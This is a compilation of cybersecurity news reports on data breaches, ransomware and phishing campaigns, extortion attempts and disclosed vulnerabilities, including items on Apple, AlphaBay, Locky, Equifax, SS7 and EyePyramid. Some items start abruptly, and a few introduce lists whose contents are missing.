Motherboard‘s Joseph Cox reports that one of the hackers shared screenshots of emails that had allegedly been exchanged with Apple, including one where a member of Apple’s security team asked if the group would be willing to share a sample of the stolen data.
If emails shared by the hackers are legitimate, then it appears that Apple’s security team also requested that a YouTube video be removed of an unnamed member of the gang using stolen credentials to access an elderly woman’s iCloud account and view photos that had previously been backed up online.
The alleged emails from Apple go on to underline that the technology firm will “not reward cyber criminals for breaking the law”.
What we don’t know is whether the email exchanges between the hackers and Apple are real or faked, and – indeed – whether the so-called “Turkish Crime Gang” really has access to a large number of Apple users’ credentials.
Other than the video of the elderly woman’s iCloud account being broken into, there has been no evidence shared with the media to suggest that the hackers’ claims of having gained access to a large database of Apple usernames and passwords are legitimate.
However, if it’s true that the hackers are attempting to engage with the media in an attempt to increase their chances of a substantial payout then that would be in line with an increasingly common technique deployed by extortionists.
For instance, we have discussed before how an individual hacker or hacking group known as The Dark Overlord has targeted investment banks – stealing internal documents and bringing them to the public’s attention in an attempt to extort more money.
In another extortion attempt, The Dark Overlord stole hundreds of gigabytes of files from the Gorilla Glue adhesive company, and attempted to increase their chances of crowbarring more money out of corporate victims by sharing details with security industry media.
For the record, when The Dark Overlord contacted me to help them blackmail companies, I declined.
I believe that companies should do everything in their power to protect their customers and prevent criminals from profiting from extortion.
We simply don’t know the truth of the Turkish Crime Family’s claims, and whether Apple users are at risk.
But I do hope that the media stories will help remind Apple users of the importance of using a strong, unique password to secure their account and enable two-factor authentication to make their accounts harder to break into.

Researchers from several German universities have checked the PHP codebases of over 64,000 projects on GitHub, and found 117 vulnerabilities that they believe have been introduced through the use of code from popular but insufficiently reviewed tutorials.
The researchers identified popular tutorials by inputing search terms such as “mysql tutorial”, “php search form”, “javascript echo user input”, etc. into Google Search.
The first five results for each query were then manually reviewed and evaluated for SQLi and XSS vulnerabilities by following OWASP’s guidelines (Reviewing Code for SQL Injection, Cross Site Scripting Prevention Cheat Sheat). This resulted in the discovery of 9 tutorials containing vulnerable code (6 with SQLi, 3 with XSS). 
Based on these, they created two types of queries that they used against the aforementioned data set obtained from GitHub. “We use strict queries to identify known vulnerable patterns in web applications, and normal queries to identify code analogues of tutorial code,” they explained. 
The results were, finally, manually reviewed by the researchers.
“Thanks to our framework, we have uncovered over 100 vulnerabilities in web application code that bear a strong resemblance to vulnerable code patterns found in popular tutorials. More alarmingly, we have confirmed that 8 instances of a SQLi vulnerability present in different web applications are an outcome of code copied from a single vulnerable tutorial,” they noted. “Our results indicate that there is a substantial, if not causal, link between insecure tutorials and web application vulnerabilities.”
“[Our findings] suggest that there is a pressing need for code audit of widely consumed tutorials, perhaps with as much rigor as for production code,” they pointed out.
In their research, they evaluated only PHP application code, but their approach can be easily used to evaluate codebases in other programming languages, especially because they have made available their crawler (GithubSpider) and code analogue detector (CADetector) tools.
Unfortunately, such a search can be easily replicated – “even with limited resources such as a standard PC and a broadband DSL connection” – by individuals or groups intent of discovering vulnerabilities in software for future exploitation.

One of the largest trading posts on the Dark Web, AlphaBay, has rewarded a researcher for disclosing the existence of a vulnerability which allowed him to steal over 200,000 private messages exchanged between users and sellers.
Earlier this week, the hacker, known only as Cipher0007, disclosed the existence of two ""high-risk"" bugs through Reddit.
In a forum post, the hacker said the two security flaws could be exploited to snatch private messages.
Cipher0007 was able to compromise AlphaBay and steal the first and last names of buyers and sellers, nicknames, addresses, and the tracking IDs of packages sent by traders when included in the messages and not protected by PGP keys.
The hacker also issued a number of screenshots of private messages as proof, which revealed the messages were not encrypted by default.
After disclosing the vulnerabilities on Reddit, Cipher0007 opened a number of support tickets on AlphaBay, warning the Dark Web trading post of the potentially devastating bugs which could compromise the privacy and identities of users.
In a statement on PasteBin, AlphaBay confirmed the validity of the vulnerabilities and said the bugs allowed the hacker to slurp a total of 218,000 messages which were not older than 30 days.
Older messages are automatically purged from the system.
The attacker was paid for disclosing the flaws rather than selling them on or releasing the stolen information to the public.
In return, Cipher0007 revealed his methods and several hours later AlphaBay developers were able to close the loopholes.
As Dark Web marketplaces must provide strong assurances that users will remain anonymous due to the nature of goods sold there, often illegally, these kinds of vulnerabilities have the potential to destroy such businesses.
Alternatively, these security flaws would be of interest to law enforcement agencies attempting to close down such operations -- and may have been known to them before the hacker discovered the bugs.
Unless users indulging in risky, illegal trading take responsibility for their own privacy by using PGP keys and personal encryption, they cannot cry foul if their personal information is leaked.

Recently a hacker identified the existence of two high-risk bugs and revealed this information on Reddit’s forum posts.
The hacker, who uses the alias Cipher0007, managed to steal 200,000 private messages.
These messages were exchanged between users/buyers and sellers.
ZDNet reports that Cipher0007 disclosed the vulnerabilities earlier this week and revealed on Reddit that these flaws could be used to steal private messages on AlphaBay.
The messages weren’t protected by PGP keys, which made it easier for Cipher0007 to steal them in such large proportion.
Must Read: 
AlphaBay posted an official statement on Pastebin in which they admitted the presence of these bugs and also confirmed that Cipher0007 has hacked around 218,000 messages.
It must be noted that the hacked messages weren’t older than 30 days since the site’s system automatically purges messages that are more than 30 days old.
To prove that he has managed to infiltrate AlphaBay and stole private messages, Cipher0007 posted numerous screenshots too.
AlphaBay rewarded Cipher0007 for not selling the flaws or exposing the stolen data to the public.
Cipher0007 then disclosed the methods he used to exploit AlphaBay to the company and finally the developers at the trading platform managed to fix the flaws.

The Necurs botnet has, once again, begun pushing Locky ransomware on unsuspecting victims.
The botnet, which flip-flops from sending penny stock pump-and-dump emails to booby-trapped files that lead to malware (usually Locky or Dridex), has been spotted slinging thousand upon thousand of emails in the last three or four days.
“Talos has seen in excess of 35K emails in the last several hours associated with this newest wave of Locky,” Cisco Talos researchers noted on Friday. 
In the first part of the spam campaign, the emails contain no text except in the Subject line, which simply says “Receipt” or “Payment”, followed by random numbers. Those numbers are seen again in the name of the attached PDF file (as seen in the screenshot above).
Later, the emails were made to look like they contained a scanned image in PDF format for the recipient to peruse.
In both cases, the attached PDF contains embedded Word documents with macros, and in order for them to be opened and run the aforementioned macros, users are required to enable them. This is achieved through subterfuge: the victims are shown a note saying that the document is protected, and that they have to “Enable editing” in order to view it.
Before that, the victims are also prompted to allow the opening of the file – a step that’s required for the malware to bypass the protection offered by the program’s sandbox.
“The word document itself contains an XOR’d Macro that downloaded the Locky sample from what is likely a compromised website,” the researchers explained, noting that the DNS requests associated with the domain serving the malware have been spiking, but that it’s difficult to determine if these requests are from victims or the many security practitioners that are investigating this widespread campaign.
Users who go through through all the motions required to serve the malware will end up with their files encrypted and the .osiris extension added to them. The criminals behind the ransomware are asking for 0.5 Bitcoin (around $620) in order to decrypt the files.
Unfortunately for them, there is currently no way to decrypt the files without paying the ransom, so they’ll need to choose between losing the files (if they have no backup) or paying up (although there is no guarantee that the crooks will keep their word).

Two-thirds of police internet-connected CCTV cameras in Washington DC were forced offline in January ahead of the presidential inauguration after a ransomware attack.
Officials told the Washington Post that 123 out of a network of 187 cameras were affected.
The devices are apparently used run by the police to monitor public spaces.
The attack targeted 70% of the storage systems on which camera data is recorded, leaving them out of action from 12 to 15 January, the report claimed.
However, the issue was resolved by removing each device’s software and reinstalling at each site.
There are said to have been at least two forms of ransomware on the system, although local officials have played down the seriousness of the attack.
The ransomware was isolated to the CCTV network and didn’t affect police investigations or put public safety in jeopardy, according to the report.
In related news, police in Texas have lost nearly eight years’ worth of digital evidence after refusing to pay a ransomware fine.
The Cockerell Hill Police Department in south Dallas decided after speaking to the FBI not to pay the near $4000 ransom after discovering the malware in mid-December.
The ransomware was introduced to the network via a spam email spoofed to imitate a department-issued address.
A statement published by WFAA last week has the following:
“This virus affected all Microsoft Office Suite documents, such as Word documents and Excel files.
In addition, all body camera video, some in-car video, some in-house surveillance video, and some photographs that were stored on the server were corrupted and were lost.
No information contained in any of those documents, videos, or photographs was extracted or transmitted outside of the Police Department”.
The files affected date all the way back to 2009, although the police tried to play down the impact on investigations, claiming that hard copies of all documents and “the vast majority” of videos and photographs are still kept on CD/DVD.
“It is unknown at this time how many total digital copies of documents were lost, as it is also unknown how many videos or photographs that could have assisted newer cases will not be available, although the number of affected prosecutions should remain relatively small,” it noted.

Updated An independent researcher claims to have uncovered a security flaw in Microsoft Edge.
The issue enables any website to identify someone by their username from another website, according to Ariel Zelivansky. More specifically the bod alleges that Edge exposes the URL of any JavaScript Fetch response, in contradiction to the specification. This is a problem because it's possible to identify netizens by crafting a fetch request in a webpage that will redirect to a URL containing the visitor's username  (e.g. requesting https://facebook.com/me will pull in  https://facebook.com/username).
Zelivansky alerted Microsoft but the software giant said the issue was not a security problem. El Reg also prodded Redmond only to be told the tech giant had nothing to add beyond its response to Zelivansky.
The researcher went public with his findings and tipped off The Reg earlier this month after Redmond decided the issue didn't merit a security fix. The privacy shortcoming has spawned a discussion thread on Reddit. ®
Despite Microsoft's silence, it turns out the Windows giant has decided to assign an engineer to look into the matter – but it is still not being treated as a security vulnerability.

About 1,000 files accessed may include personal identity information of individuals who have made a complaint about an Abta-registered travel agent.
It says it is contacting those affected by the hack which happened on 27 February and has a dedicated helpline.
It has also alerted the police and the Information Commissioner's Office (ICO).
Part of the ICO's role is to help the public manage their personal data.
Abta chief executive Mark Tanzer said he would ""personally like to apologise for the anxiety and concern"" caused to Abta customers and members.
""It is extremely disappointing that our web server, managed for Abta through a third party web developer and hosting company, was compromised and we are taking every step we can to help those affected.""
Mr Tanzer said the organisation was not aware of any of the information being shared beyond the infiltrator.
The organisation gives advice and guidance to holidaymakers, sets standards for travel firms and promotes responsible tourism in the UK and abroad.
It said the type of data which may have been accessed included:
Abta said the ""vast majority"" of the 43,000 people affected were those who had registered with email addresses and encrypted passwords or had filled in an online form with basic contact details.
It said there was ""a very low exposure risk to identity theft or online fraud"" with this kind of data.
It advised customers and ABTA members registered on the site to change their passwords as a ""precautionary measure"".
It has also offered people who may be affected a free-of-charge identity theft protection service.

Amateur cybercriminals may be shifting towards targeting the healthcare sector using an off-the-shelf ransomware, according to security researchers at Forcepoint Security Labs.
Forcepoint is an Austin, Texas-based cybersecurity software company and Roland Dela Paz, a senior security researcher at the company, detailed in a blog post that Forcepoint Security Labs has identified a ransomware-as-a-service (RaaS) platform, called Philadelphia, used in a cyber attack on a healthcare organization.
“In that attack, a shortened URL, which we believe was sent through a spear-phishing email, was used as a lure to infect a hospital from Oregon and Southwest Washington. Once a user clicks on the link, the site redirects to a personal storage site to download a malicious DOCX file,” Dela Paz wrote.
He noted that the document contained the targeted healthcare organization’s logo and a signature of a medical practitioner from that organization. Three document icons pertaining to patient information also were present in the file and, when the user double-clicks, a malicious Javascript is triggered which downloads and executes a variant of the Philadelphia ransomware.
“Believed to be a new version of the Stampado ransomware, Philadelphia is an unsophisticated ransomware kit sold for a few hundred dollars to anyone who can afford it. Recently, a video advertisement of Philadelphia surfaced on Youtube,” he wrote.
Dela Paz further wrote in the blog post, “A few things in the malware captured our interest. Aside from the tailored bait against a specific healthcare organization, the encrypted JavaScript above contained a string “hospitalspam” in its directory path. Likewise, the ransomware C2 also contained “hospital/spam” in its path. Such wordings would imply that this is not an isolated case; but that the actor behind the campaign is specifically targeting hospitals using spam (spear phishing emails) as a distribution method.”
He also noted that ransomware-as-a-service platforms such as Philadelphia continue to attract would-be cybercriminals to take part in the ransomware business. And, while this example represents only one healthcare organization that was targeted, the researcher noted that it could signify the beginning of a trend with smaller ransomware operators, using RaaS platforms, aiming for the healthcare sector, “ultimately leading to even bigger and diversified ransomware attacks” against the sector, he wrote.

Since last Friday, over 200,000 victims in 150 countries have been hit by a massive, international ransomware cyberattack called WannaCry.
Ransomware is a type of malware that works by seizing control of and blocking access to a computer’s files, programs, and operations.  Users are then informed that they must pay a certain amount in order to regain access to their files, with the threat of permanently losing all of their data if they choose not to pay.  In the WannaCry attack, users were given three days to make the payment before the fee increased, and seven days before the files would be lost forever.
The massive scope and potential financial impact of the WannaCry attack has understandably caused a lot of panic, and companies and individuals alike have been rushing to protect their devices.  However, this frenzy has opened up new damaging routes for fraud.
One of these attack routes is through mobile applications that have been found on third-party application stores.  There are various mobile applications advertising that they can be used to protect users from the WannaCry ransomware.  However, our analysts found that some of these apps contained adware meant to infect the devices they are downloaded onto.  Rather than protecting users’ devices, they are causing them harm.

 The adware found is classified as Adware.mobidash, which is a module that attackers used to include into Android games and apps and monetize them. This adware has the capability to load webpages with ads, show other messages in the status bar, and modify the DNS server. This is quite dangerous as the real risk lies in the fact that the end user’s device is performing unwanted activity without their authorization.
To hide this dangerous behavior, the adware doesn’t start to perform its malicious activity immediately; instead, it lies latent in the device before activating after a short period of time.
We have blogged a lot about digital trust, fake news, and all sorts of tricks that criminals use to get the attention of consumers to get them to click on a link. Yet we continue to be amazed by how sophisticated the manipulation of the human factor has become.
It will only be a matter of time until we see the WannaCry malware expand further to trick end users into installing a patch that allegedly prevents the new massive ransomware attack. However, this time it will not be a patch, but a new version or variant of a financially motivated malware.

The Equifax data breach in which millions of Americans had their personal details stolen may have been carried out by a foreign government in a bid to recruit U.S. spies, experts believe. 
Hackers took addresses, dates of birth, Social Security details and credit card numbers from 148million people when they targeted the credit ratings giant Equifax in 2017. 
But the stolen data has not appeared on any 'dark web' sites which sell personal information for sinister use, analysts have said. 
The data's apparent disappearance has led some experts to conclude that it is in the hands of a foreign government, CNBC reported.
One analyst told the channel: 'We are all working to be able to consistently determine whether this data is out there and whether it has ever been out there.
And at this time there has been absolutely no indication, whatsoever, that the data has been disclosed, that it has been used or that it has been offered for sale.
Another ex-intelligence worker said personal data could be used by foreign governments to identify powerful people who were having financial problems.
Those people would be prime targets for a bribe or might be attracted by a job offer, he said. 
It has also been suggested that the criminals who stole the data feared detection if they sold it online and have kept it to themselves to avoid capture.   
Equifax, one of America's three leading consumer reporting agencies, announced the huge data hack in September 2017 and its CEO Richard Smith resigned later that month.
They initially said 143million people had been affected but the number eventually grew to 148million, equivalent to nearly half the U.S. population. 
The hackers targeted the company for 76 days until the attack was spotted, according to a congressional report.  
Hackers gained access to 48 databases between May 13 and July 29 when Equifax noticed the intrusion, the report said.   
Last year the firm admitted that passport images and information had also been stolen. 
The U.S. House committee which investigated the breach said the firm had 'failed to fully appreciate and mitigate its cybersecurity risks'. 
'Had the company taken action to address its observable security issues prior to this cyberattack, the data breach could have been prevented,' the committee's report said.

High street banks are losing the battle against fraud as criminals switch tactics to directly target customers.
Efforts by lenders to bolster their IT defences against hackers have simply encouraged fraudsters to bombard individual customers with scams, according to Financial Fraud Action UK.
Despite investing millions in tackling fraud, losses from fraud rose last year as banks became less effective at preventing scams.
Financial Fraud Action UK said this was ‘largely due to criminals shifting their methods away from using malware attacks on online banking systems, which bank security processes identified’.
Increasingly, it said, fraudsters are focussing on targeting individuals directly, which is harder for banks to stop.
The report said the main ploy used by criminals is the ‘impersonation and deception scam’ whereby they pretend to be from a ‘legitimate and trusted organisation’ such as a bank, the police, a utility company or a government department.
These scams typically involve the fraudster contacting the customer through a phone call, text message or email.
Often the fraudster will claim there has been suspicious activity on an account, ask the individual to verify or update their account details, or claim they are due a refund.
The criminal then attempts to trick the target into giving away their personal or financial information, such as passwords, payment card details or bank account information.
Financial Fraud Action UK – which represents banks - said its intelligence suggests criminals have also recently increased their focus on ‘phishing’ emails claiming to be from major online retailers and internet companies.
It warned these emails are an ‘increasingly sophisticated’ attempt to trick recipients into giving away personal and financial details, or into downloading malware software which hacks into their computers.
Several banks have been targeted by high profile cyber attacks that have attempted to exploit weaknesses in their IT systems.
Last November criminals launched an online attack against Tesco Bank that resulted in the loss of £2.5million from 9,000 accounts.
Others to have been targeted include Royal Bank of Scotland and NatWest, Lloyds and HSBC.
The threat to Britain’s financial infrastructure from persistent cyber-attacks prompted chancellor Philip Hammond to commit an extra £1.9billion in the autumn statement to boost Britain’s defences against the growing online threat.

A pair of iOS bugs identified as resolved by Apple in its latest iOS 12.1.4 release were successfully exploited by hackers, according to a Google researcher who shared details of the zero-day vulnerabilities on Thursday.
Apple's latest iOS 12.1.4 release, issued earlier today, contains fixes for Foundation and IOKit flaws that, according to security researcher Ben Hawkes, were used to hack devices in the wild.
As noted by ZDNet, Hawkes, leader of Google's Project Zero security team, shared the revelation on Twitter late Thursday, saying the iOS bugs were leveraged as zero-day vulnerabilities.
How, exactly, the vulnerabilities were exploited and by whom is unknown.
Both bugs were detailed in Apple documentation detailing security changes delivered with the iOS 12.1.4 package.
Logged with the identifier CVE-2019-7286, the Foundation flaw involves a memory corruption issue that could allow an app to gain elevated privileges in iPhone 5s and later, iPad Air and later, and iPod touch 6th generation. An anonymous researcher, Clement Lecigne of Google Threat Analysis Group, Ian Beer of Google Project Zero and Samuel Grob of Google Project Zero were credited with finding the flaw.
The second bug, identified as CVE-2019-7287, also involves a memory corruption, but instead of granting elevated privileges it allows an app to executive code with kernel privileges on iPhone 5s and later, iPad Air and later, and iPod touch 6th generation. The same researchers were credited with the find.
Apple released iOS 12.1.4 alongside a supplemental update to macOS Mojave to address the widely publicized FaceTime flaw that allowed interlopers to eavesdrop on Group FaceTime calls. The update also patched a Live Photos in FaceTime bug that was discovered after Apple conducted a ""thorough security audit"" of the service. Details of the Live Photos vulnerability have yet to be made public.

Cybercriminals prey on naivety, and a new scam campaign that attempts to trick people into providing bank details to pay for a fake WhatsApp subscription does just that.
WhatsApp did once charge a subscription fee of $0.99/£0.99, but stopped the practice in January 2016.
However, the fraudsters behind this latest scam are looking to take advantage of the fact WhatsApp -- which has over a billion users -- did once rely on a subscription service to dupe victims into handing over their banking information.
The UK's fraud and cybercrime centre Action Fraud and the City of London police have issued a warning about the campaign. Emails purporting to be from 'The WhatsApp Team' claim that ""your subscription will be ending soon"" and that in order to continue to use the service, you need to update your payment information.
Victims are encouraged to sign into a 'customer portal' with their number and to enter payment information. 
Naturally, this is a scam -- with spelling errors in the text a huge giveaway -- and all the victims are doing is providing criminals with their financial details. Criminals could use these to simply make purchases or as a basis for further fraud. Scammers have also been known to use text messages in an effort to dupe victims into paying for a fake subscription.
Those who receive the email are urged not to click on any of the links, but to instead report it to the police. Action Fraud also offers advice to those who have already fallen for the scam, telling victims to ""run antivirus software to ensure your device has not been infected with malware"".
Scammers often attempt to lure victims into handing over their credit card information -- or installing malware onto their machines -- often with authentic-looking phishing emails claiming to be from real companies.
Previously, Action Fraud has warned about scammers attempting to steal credentials from university staff with fake emails about a pay rise, while police have also issued a warning about cybercriminals attempting to infect people with banking malware using emails that pretend to be from a charity.

More than one million Brits over the age of 45 have fallen victim to some form of email-related fraud, as the internet supersedes the telephone as the favored channel for scammers, according to Aviva.
The insurer polled over 1000 adults over the age of 45 in the latest update to its long-running Real Retirement Report.
Further, 6% said they had actually fallen victim to such an online attack, amounting to around 1.2 million adults.
Some 22% more people it surveyed had been targeted by email rather than phone-based fraud.
Aviva claimed this is important because the government is currently consulting on whether to ban cold calling in a bid to hit pension scammers.
It highlights the need for regulators to address digital fraud at the same time, the insurer claimed.
Over 20.6 million UK adults over 45 have been targeted by an email scam, versus nearly 17m via the telephone, Aviva calculated.
Despite this, 69% of respondents claimed technology has made life easier for them, in areas like managing their finances (66%), travel (65%) and education (51%).
However, a sizeable minority claimed digital technologies are becoming too complicated (38%), are not designed with their age group in mind (27%) and make them feel vulnerable (21%).
An Aviva spokesperson confirmed to Infosecurity that respondents were asked if they had ever been targeted by fraudsters – not just in the past year.
No breakdown was given as to the type of scams they might have faced, although phishing and 419 fraud usually rank among the most common.

Recent attacks against insecure MongoDB, Hadoop and CouchDB installations represent a new phase in online extortion, born from ransomware’s roots with the promise of becoming a nemesis for years to come.
First spotted on Dec. 27 by Victor Gevers, an ethical hacker and founder of GDI Foundation, attacks in the past two months shot up from 200 to near 50,000.
The first of these ransom attacks against insecure databases traces back to a hacker identified as Harak1r1, who Gevers said was responsible for compromising open MongoDB installations, deleting their contents, and leaving behind a ransom note demanding 0.2 BTC (about $220 at the time).
After that, escalation of attacks against open MongoDB installations happened fast, jumping from hundreds one week, to 2,000 the next, and 10,000 the following week.
At last count more than 56,000 open MongoDB databases alone are ripe for attack, according to the most recent numbers available from GDI Foundation.
But that doesn’t include a slew of new databases now being targeted by cybercriminals.
Security researchers at Rapid7 estimate that 50 percent of the 56,000 vulnerable MongoDB servers have been ransomed.
In a typical ransomware attack, an attacker compromises a computer via malware or Trojan and encrypts local data that can only be unlocked with an encryption key obtained for a price.
That spurred a maturing of ransomware used against more sophisticated healthcare, government and educational targets with similar phishing, malware and Trojan techniques.
However, experts say, both have acted as the stepping stones to this type of data hijacking.
With data hijacking, attackers compromise insecure database installations, copy data, then delete the contents and leaving behind a ransom note in the form of a directory name demanding a ransom be paid via Bitcoin.
Rapid7 has already seen additional databases such as Redis, Kibana and other SQL databases targeted in its honeypots.
Josh Gomez, senior security researcher with security firm Anomali, said moving forward attacks will be less random, more targeted and seek high-value repositories with weak protection.

Nearly three weeks after many of its systems were knocked out by a complex ransomware virus , Alaska’s Matanuska-Susitna Borough has restored most of its phone system, part of its geospatial information system and the online portal on which residents can pay their looming property-tax bills. But the borough, home to about 106,000 people outside Anchorage, still has many services to restore, prompting its elected officials last week to approve a disaster declaration in the cyberattack’s wake. 
 The declaration could make the borough eligible for assistance from the Federal Emergency Management Agency. Meanwhile, local government systems are slowly blinking back online. In its most recent updates, the borough says it’s restored departments’ phone servers and that full email service is expected within a week.
But other systems are still being rebuilt after the borough’s encounter with the ransomware known as BitPaymer, which locked down systems ranging from main file servers to the card-swipe mechanisms that control doors in government buildings. BitPaymer is a complex cocktail of malware that enters a targeted system through a Trojan horse, then lies dormant until it’s noticed and authorized users attempt to remove it, at which point it locks up the system with a demand for a sum of money payable in bitcoin.
 “All of the pieces of this are the absolute worst in the world, and they have all been combined together and put on us at one time,” borough IT Director Eric Wyatt says in a recent YouTube video about the response to the cyberattack.
In the case of Mat-Su, as the borough is known to residents, Wyatt has said the Trojan component likely arrived as early as May 3, more than two months before an attempted anti-virus sweep triggered the ransom demand. According to evidence found during the initial investigation of the attack, Mat-Su was at least the 210th victim of the BitPaymer package since it was first unleashed in June 2017. This week, it possibly found its latest victim in the Professional Golfers Association, employees of which found themselves locked out of their systems on the eve of the prestigious PGA Championship. According to the cybersecurity research website BleepingComputer , the attack on the PGA resembles the one that hit Mat-Su.
 There’s no apparent timeline for when all of Mat-Su’s systems will be back to normal, though Wyatt says in his video update that the borough is receiving assistance from at least 20 other organizations, including tech vendors and the FBI.
But the restoration of property tax payments on Aug. 2 came just in time: homeowners are required to pay half their 2018 tax bills by Aug. 15, and as a borough press release states , “there is traditionally a very long line for making payments in person.”

Microsoft has seen its share of issues as of late, and now a seemingly simple patch is causing serious issues to certain laptops running the 2016 Anniversary Update. The update was originally released to prevent a zero-day attack on IE.
Per Microsoft, this was the issue being fixed: 
    A remote code execution vulnerability exists in the way that the scripting engine handles objects in memory in Internet Explorer. The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user. An attacker who successfully exploited the vulnerability could gain the same user rights as the current user. If the current user is logged on with administrative user rights, an attacker who successfully exploited the vulnerability could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.
    In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerability through Internet Explorer and then convince a user to view the website, for example, by sending an email.
    The security update addresses the vulnerability by modifying how the scripting engine handles objects in memory.
But now that fix is causing a pretty big problem of its own: it’s preventing certain laptops from booting. The affected machines are part of a pretty small bunch—only Lenovo laptops with less than 8 GB of RAM running the 2016 Anniversary Update (1607)—but it’s still a pretty bad problem to have.
Fortunately, there’s a way to bypass the failed boot by restarting into the UEFI and disabling Secure Boot. It’s also noted that if BitLocker is enabled that you may have to go through BitLocker recovery after disabling Secure Boot. 
On the upside, Microsoft is working with Lenovo to correct the issue and will release a fix sometime in the future. I just wouldn’t count on it before the end of the year. Until then, be careful when updating devices, especially if they happen to be Lenovo laptops with limited RAM.

 For years, researchers, hackers, and even some politicians have warned about stark vulnerabilities in a mobile data network called SS7. These flaws allow attackers to listen to calls, intercept text messages, and pinpoint a device's location armed with just the target's phone number. Taking advantage of these issues has typically been reserved for governments or surveillance contractors.
But on Wednesday, German newspaper The Süddeutsche Zeitung reported that financially-motivated hackers had used those flaws to help drain bank accounts.
This is much bigger than a series of bank accounts though: it cements the fact that the SS7 network poses a threat to all of us, the general public. And it shows that companies and services across the world urgently need to move away from SMS-based authentication to protect customer accounts.
""I'm not surprised that hackers take money that is 'lying on the table'. I'm just surprised that online bank thieves took so long in joining spying contractors in abusing the global SS7 network,"" Karsten Nohl, a cybersecurity researcher who has highlighted vulnerabilities in SS7, told Motherboard in an email.
In short, the issue with SS7 is that the network believes whatever you tell it. SS7 is especially used for data-roaming: when a phone user goes outside their own provider's coverage, messages still need to get routed to them. But anyone with SS7 access, which can be purchased for around 1000 Euros according to The Süddeutsche Zeitung, can send a routing request, and the network may not authenticate where the message is coming from.
That allows the attacker to direct a target's text messages to another device, and, in the case of the bank accounts, steal any codes needed to login or greenlight money transfers (after the hackers obtained victim passwords).
Although some telcos have taken steps to mitigate the issue, there are clearly still huge gaps for hackers to exploit.
""Everyone's accounts protected by text-based two-factor authentication, such as bank accounts, are potentially at risk until the FCC and telecom industry fix the devastating SS7 security flaw,"" Lieu said in a statement published Wednesday. ""I urge the Republican-controlled Congress to hold immediate hearings on this issue.""
In the meantime, and maybe irrespective of whether SS7 problems are ever fixed, social media companies, banks, and other online services need to stop using SMS-based two-factor authentication. Last year the National Institute of Standards and Technology said it was no longer recommending solutions that used SMS.
Twitter does let users sign in with a code from Google Authenticator, an app on your smartphone that provides a more robust form of two-factor authentication, but the site apparently still sends those logging in an SMS code, which, in light of these recent SS7 attacks, totally undermines the extra security protections. Twitter did not immediately respond to a request for comment. 
 Motherboard even recently published a piece telling general readers that they were likely fine with only SMS-based two-factor authentication, which focused on another type of attack and was based on the premise that non-state hackers were not widely using SS7. That piece, clearly, is out of date.
""It is unacceptable the FCC and telecom industry have not acted sooner to protect our privacy and financial security,"" Lieu's statement added.

The two hired the services of a local programmer to develop their own brand of malware, a backdoor trojan, which authorities have named EyePyramid.
The men used simple spear-phishing emails sent to the high-ranking officials they wanted to infect.
The emails came with a file attachment, which when opened would covertly install their malware.
EyePyramid would collect information from the target's system, such as passwords, sensitive documents, and more.
The malware would upload this data to various online servers or send to an email address (via SMTP).
Italian officials said the two suspects, Giulio Occhionero (age 45) and Francesca Maria Occhionero (age 49), had most likely used this information for financial profits.
It is unclear if this means stock market transactions or blackmail attempts.
The two were discovered when one of their emails reached a security researcher, who discovered the payload and notified local police.
An investigation followed, and Italian police, together with the FBI, arrested the two and seized servers used to spread the malware and store the stolen data.
The two deployed their malware in separate campaigns that took place in 2008, 2010, 2011, 2012, and 2014.
Court documents reveal the men used the malware to collect around 87GB of data, consisting of keystroke information, 18,327 usernames, and 1,793 passwords.
Username and password information was arranged in 122 categories, based on the target's affiliation, such as business, politics, and more.
The EyePyramid malware targeted the following file types for exfiltration:
A full list of IOCs has been compiled by Trend Micro security researcher Federico Maggi and is available on GitHub.
The researcher has also published an analysis of the malware's inner workings, not available in court documents, on the Trend Micro blog.
The list of victims includes names such as former prime minister Matteo Renzi, former prime minister Mario Monti, cardinal Gianfranco Ravasi, head of the European Central Bank Mario Draghi, Vatican officials, members of Italy's tax police, Bank of Italy officials, and representatives of the Italian Senate, and members of several Italian ministries (Finance, Economy, Internal Affairs, Foreign Affairs, and others).
In a TV interview, Italian investigators said Giulio Occhionero was a high-ranking member of a Masonic lodge.
The words ""eye"" and ""pyramid,"" used regularly in the malware's source code, are some of the most known symbols of Freemasonry.

Microsoft's new Outlook 2010 update ought to provide the critical security fixes without the crashes.
Microsoft has released a new update for Outlook 2010 that should plug its critical security flaws without causing crashes. 
Microsoft earlier this week warned that the 64-bit version of the security update KB 4461529 from its November Patch Tuesday was causing Outlook 2010 crashes.
Despite the crashes, Microsoft warned users not to remove the update, which plugged four remote code execution flaws that it said were more likely be exploited. Until a new update was released Microsoft recommended users try Outlook Web Access instead.
As spotted by Woody Leonhard, Microsoft this week released KB 4461585 for Outlook 2010, which includes patches for the four flaws and shouldn't trigger crashes. Microsoft confirmed it does fix the crash issues caused by KB 4461529.
The fixed update can be downloaded from Microsoft's download center and not the Microsoft Update Catalog.
Microsoft cautions the update is only for the .msi edition of Office 2010 and not for Office 365 Home.
""Be aware that the update in the Microsoft Download Center applies to the Microsoft Installer (.msi)-based edition of Office 2010. It doesn't apply to the Office 2010 Click-to-Run editions, such as Microsoft Office 365 Home,"" Microsoft notes.
Microsoft has set out instructions for checking which edition you have in a blogpost.
There are no further updates available for the Outlook 2010 non-security updates KB4461522 and KB2863821, which Microsoft pulled on November 15 because they were causing crashes in Access and other apps. Microsoft recommended users uninstall both the updates.

In a new blog post researchers from Proofpoint have tracked a phishing campaign leveraging the concept of “Twitter Brand Verification”.
Because the actors in this case are relying on paid, targeted ads on Twitter, users don’t need to do anything to see the phishing link.
Attackers are increasing the sophistication of social engineering approaches and extending them across social channels.
Users and brands need to be increasingly savvy to avoid getting snared by ads, accounts, and messages that initially look legitimate.
While this attack was observed on Twitter, such a scam could be implemented on any social media platform that implements some form of account verification.
The full blog post can be found here, however key takeouts include:
“Verified accounts” are a powerful tool on Twitter to help brands differentiate themselves from fraudulent, impersonation, and parody accounts on the social media site.
When an account is officially verified, it displays a special badge intended to reassure Twitter users that they are interacting with a genuine brand and not an impostor.
Recently, however, threat actors are using the promise of verified accounts to lure users into a credit card phishing scheme.
Account verification is a process that Twitter manages for “accounts of public interest” and requires brands to go through multiple verification steps.
The promise, then, of a quick verification process is attractive, especially to smaller businesses that potentially lack the resources to meet Twitter’s requirements for account verification.
In this phishing attack, discovered by Proofpoint researchers in December, attackers place legitimate ads targeting brand managers and influencers with a link to a phishing site purporting to offer account verification.
The ads themselves come from an account that mimics the official Twitter support account, @support.
